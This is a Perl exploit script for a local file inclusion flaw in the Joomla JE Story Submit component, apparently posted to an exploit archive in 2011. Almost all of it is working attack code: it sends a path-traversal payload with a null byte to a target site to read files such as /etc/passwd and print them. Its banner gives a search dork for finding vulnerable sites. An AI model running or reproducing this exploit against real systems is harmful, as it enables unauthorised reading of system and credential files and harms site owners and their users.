#! /usr/bin/perl -w

# Joomla Component JE Story Submit Local File Inclusion Vulnerability
# Author   : v3n0m
# Date     : July, 21-2011 GMT +7:00 Jakarta, Indonesia
# Software : JE Story Submit
# Vendor   : http://joomlaextensions.co.in/
# License  : GPLv2 or later
# Tested On: Joomla 1.5.x
# irc.yogyacarderlink.web.id - www.yogyacarderlink.web.id
#
# PoC - http://127.0.0.1/[path]/index.php?option=com_jesubmit&view=[LFI]%00
#

use LWP::UserAgent;
use HTTP::Request::Common;

my ($host, $file) = @ARGV ;

sub clear{
system(($^O eq 'MSWin32') ? 'cls' : 'clear'); }
clear();
print "|==========================================================|\n";
print "|  'Joomla Component JE Story Submit Local File Inclusion' |\n";
print "| Coded by : v3n0m                                         |\n";
print "| Dork     : inurl:com_jesubmit                            |\n";
print "|                                                          |\n";
print "|                               www.yogyacarderlink.web.id |\n";
print "|                                                          |\n";
print "|===================================[ YOGYACARDERLINK ]====|\n";
print "\nUsage: perl $0 <target> <file_to_edit>\n";
print "\tex: perl $0 http://www.site.com /etc/passwd\n\n";

$host = 'http://'.$host if ($host !~ /^http:/);
$host .= "/" if ($host !~ /\/\$/);

my $ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008072820 Firefox/3.0.1");
$ua->timeout(10);

my $request = HTTP::Request->new();
my $response;
my $url = $host."index.php?";

my $req = HTTP::Request->new(POST => $host."index.php?");
$req->content_type('application/x-www-form-urlencoded');
$req->content("option=com_jesubmit&view=".("/.."x10).$file."%00");

$request = $ua->request($req);
$result = $request->content;

$result =~ s/<[^>]*>//g;

print $result . "\n";
exit;